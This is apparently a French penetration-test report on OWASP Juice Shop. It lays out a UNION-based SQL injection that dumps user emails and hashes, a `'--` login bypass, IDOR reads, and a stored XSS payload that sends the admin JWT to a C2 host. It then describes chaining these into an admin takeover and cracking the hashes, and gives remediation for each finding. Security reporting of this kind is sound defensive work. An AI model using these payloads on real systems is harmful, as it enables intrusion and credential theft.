VULN-01 · Critique · CVSS 9.8 CWE-89 · OWASP A03:2021

Injection SQL UNION-based

Paramètre q non filtré sur /rest/products/search — SQLite — 9 colonnes

GET /rest/products/search?q=
test')) UNION SELECT
id,email,password,role,
username,5,6,7,8
FROM Users--
→ HTTP 200 · 22 users exfiltrés
admin@juice-sh.op | admin | 0192023a...
bender@juice-sh.op | customer | 0c36e517...
support@juice-sh.op | admin | 3869433d...
Impact
22 utilisateurs (7 admins)
Hashes MD5, rôles, tokens
Schéma BDD via sqlite_master
Violation RGPD massive
🛡️
Remédiation :
Utiliser des requêtes préparées (Sequelize, PreparedStatement). Valider q côté serveur (whitelist alphanumérique, max 100 chars). WAF-001 : bloquer UNION SELECT, sqlite_master.
VULN-02 · Critique · CVSS 9.1 CWE-287 · OWASP A07:2021

Bypass d'authentification par SQLi

L'injection '-- sur le champ email supprime la vérification du mot de passe

POST /rest/user/login
{
"email": "bender@juice-sh.op'--",
"password": "x"
}
→ HTTP 200
{ "authentication": {
"token": "eyJ0eXAiOiJKV1Q...",
"umail": "bender@juice-sh.op"
}}
# JWT valide — sans mot de passe
Impact
Accès à n'importe quel compte dont l'email est connu. Combiné au dump SQLi : tous les comptes compromis.
🛡️
Remédiation :
Requêtes préparées sur la requête d'auth. WAF-002 : bloquer '--, ' OR dans les corps JSON. Rate limiting : 5 tentatives/min par IP. Alerter le SIEM sur les 401 répétés.
VULN-03 · Haute · CVSS 8.1 CWE-639 · OWASP A01:2021

IDOR — Accès non autorisé aux ressources

Aucune vérification que la ressource demandée appartient à l'utilisateur authentifié

IDOR Read — /api/Users/{'{id}'}
# Token Bender (id=3) → accède à :
User 1 admin@juice-sh.op [admin]
User 2 jim@juice-sh.op
User 5 ciso@juice-sh.op [deluxe]
User 6 support@juice-sh.op [admin]
HTTP 200 sur IDs 1 à 22
IDOR Read — /rest/basket/{'{id}'}
# Panier admin (basket 1) :
Apple Juice x2 = 3.98€
Orange Juice x3 = 8.97€
Eggfruit Juice x1 = 8.99€
HTTP 200 sur IDs 1 à 5
🛡️
Remédiation : Vérifier côté serveur que token.userId === requestedId avant de servir la ressource. Implémenter un middleware d'autorisation (principe du moindre privilège). Journaliser chaque accès cross-user dans le SIEM (WAF-008).

XSS stocké — avis produits
PUT /rest/products/1/reviews
{
"<script>fetch(c2+localStorage.token)</script>"
}
→ payload persisté en base ✓
→ token admin exfiltré ✓
🛡️
Rem. : Sanitiser avec DOMPurify côté serveur. Header Content-Security-Policy: default-src 'self'. Stocker JWT en cookie HttpOnly — inaccessible depuis JS.
Chaine d'exploitation · Impact maximum

XSS stocké → Vol JWT → Session hijacking admin

3 vulnérabilités enchaînées — compromission admin complète, zéro interaction après injection

1
Injection du payload
Attaquant injecte <script>fetch(c2+"?t="+localStorage.getItem("token"))</script> dans les reviews du produit #1 via PUT authentifié (SQLi bypass).
2
Exécution silencieuse
L'admin visite la page Apple Juice → le navigateur charge les avis → le <script> s'exécute automatiquement. Le JWT est lu depuis localStorage et envoyé silencieusement au C2 :9999.
3
Contrôle total
Token reçu → accès complet à /api/Users (22 comptes), /api/Feedbacks, paniers, commandes. JWT décodé : email, rôle admin, hash MD5 embarqué.
Vulnérabilités chaînées : XSS Stocké (A03) + JWT in localStorage (A02) + Absence CSP (A05)
Post-exploitation · John the Ripper · rockyou.txt

22 hashes MD5 — 4 crackés en < 2 s

MD5 sans sel = algorithme obsolète (1991). rockyou.txt suffit à compromettre les comptes principaux.
